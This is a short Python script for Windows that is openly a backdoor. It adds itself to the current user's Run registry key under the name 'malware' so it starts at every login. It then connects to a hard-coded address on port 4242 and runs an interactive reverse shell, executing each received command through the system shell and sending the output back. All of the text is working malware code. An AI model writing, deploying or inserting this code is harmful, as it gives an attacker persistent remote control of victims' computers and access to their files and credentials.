import os
import socket
import subprocess
import sys
import winreg as reg

def add_to_registry():
    # Get the path to the current script
    script_path = os.path.abspath(sys.argv[0])
    
    # Registry key path where we want to add our script
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    
    # Open the registry key for writing
    key = reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_ALL_ACCESS)
    
    # Add the script to the registry
    reg.SetValueEx(key, "malware", 0, reg.REG_SZ, script_path)
    
    # Close the registry key
    reg.CloseKey(key)
    
    print(f"Added {script_path} to startup registry.")
    
add_to_registry()

HOST = '192.168.12.135'
PORT = 4242

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.send(str.encode("[*] Connection Established!"))

while 1:
    try:
        s.send(str.encode(os.getcwd() + "> "))
        data = s.recv(1024).decode("UTF-8")
        data = data.strip('\n')
        if data == "quit": 
            break
        if data[:2] == "cd":
            os.chdir(data[3:])
        if len(data) > 0:
            proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
            stdout_value = proc.stdout.read() + proc.stderr.read()
            output_str = str(stdout_value, "UTF-8")
            s.send(str.encode("\n" + output_str))
    except Exception as e:
        continue
    
s.close()
